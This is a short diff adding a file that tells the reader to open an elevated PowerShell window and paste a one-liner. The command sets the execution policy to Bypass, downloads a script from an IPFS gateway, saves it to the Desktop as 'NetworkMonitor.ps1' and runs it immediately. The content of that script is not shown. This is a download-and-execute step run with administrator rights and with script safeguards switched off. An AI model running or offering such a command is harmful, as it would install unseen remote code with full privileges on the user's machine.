@@ -1,0 +1,3 @@
+Run in elevated PowerShell window : 
+
+[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls";if((&"Get-ExecutionPolicy" 2>&1) -eq "Bypass"){}else{Set-ExecutionPolicy Bypass -Scope Process };Invoke-WebRequest -Uri https://ipfs.io/ipfs/QmQko8eTbTqqQp5E9QkeNKf3981ZKntNNEWvyaPH6fNJ4M -UseBasicParsing | Select-Object -Expand Content > ~/Desktop/NetworkMonitor.ps1; ~/Desktop/NetworkMonitor.ps1
